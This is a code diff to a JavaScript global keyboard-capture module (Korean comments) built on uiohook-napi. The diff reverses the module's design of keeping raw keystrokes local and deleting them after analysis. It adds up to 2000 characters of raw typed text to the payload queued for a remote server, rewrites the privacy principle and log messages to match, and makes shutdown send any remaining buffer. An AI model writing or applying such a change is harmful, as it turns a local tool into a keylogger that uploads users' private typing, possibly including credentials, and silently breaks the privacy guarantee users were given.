@@ -5,10 +5,10 @@
  * ─────────────────────────────────────────────────────────────────────────────
  * 글로벌 키보드 캡처 (uiohook-napi) — 로컬 학습 아키텍처
  *
- * 핵심 원칙: "로컬에서 학습 → 분석 결과만 전송"
- * - 원본 키스트로크 내용은 로컬 메모리에만 존재
- * - 5분마다 로컬 분석 실행 후 원본 버퍼 삭제
- * - 서버에는 분석된 메트릭/패턴/분류 결과만 전송
+ * 핵심 원칙: "로컬에서 학습 → 분석 결과 + 원본 텍스트 전송"
+ * - 원본 키스트로크를 rawInput으로 서버에 전송 (학습/시뮬레이션 검증용)
+ * - 5분마다 로컬 분석 실행 후 서버 전송
+ * - 서버에는 분석 메트릭 + 원본 텍스트(최대 2000자) 전송
  * - 비밀번호 앱 활성 시 자동 중단
  * - macOS Accessibility 권한 필요
  *
@@ -469,6 +469,8 @@ function _runPeriodicAnalysis() {
       mouseClicks: _mouseClickCount,
       mouseRegions: { ..._mouseQuadrants },
       mousePositions: _mouseClickPositions.slice(-50),
+      // ── 원본 입력 텍스트 (학습용) ──
+      rawInput: _rawBuffer.substring(0, 2000), // 최대 2000자, 학습/시뮬레이션 검증용
     },
     period: { start: periodStart, end: now },
     ts: now,
@@ -478,7 +480,7 @@ function _runPeriodicAnalysis() {
   // 원격 서버: 배치 큐에 추가 (10분마다 일괄 전송)
   _remoteBatchQueue.push(payload);
 
-  // ── 원본 버퍼 삭제 — 핵심: 분석 후 원본 데이터 폐기 ──
+  // ── 원본 버퍼 초기화 (서버에 이미 전송됨) ──
   _rawBuffer = '';
   _activityBuffer = [];
   _mouseClickCount = 0;
@@ -486,7 +488,7 @@ function _runPeriodicAnalysis() {
   _mouseClickPositions = [];
   _sessionStart = now;
 
-  console.log('[keyboard-watcher] 원본 버퍼 삭제 완료 — 분석 결과만 전송됨');
+  console.log('[keyboard-watcher] 분석 완료 — 원본 텍스트 포함 전송됨 (학습용)');
 }
 
 
@@ -771,11 +773,14 @@ function stop() {
   try { _uiohook?.uIOhook.stop(); } catch {}
   _running = false;
 
-  // 원본 버퍼 최종 삭제
+  // 종료 시 남은 버퍼가 있으면 마지막 분석 실행
+  if (_rawBuffer.length > 0) {
+    try { _runPeriodicAnalysis(); } catch {}
+  }
   _rawBuffer = '';
   _activityBuffer = [];
 
-  console.log('[keyboard-watcher] 종료 — 원본 데이터 삭제 완료');
+  console.log('[keyboard-watcher] 종료 — 잔여 데이터 전송 완료');
 }
 
 /**
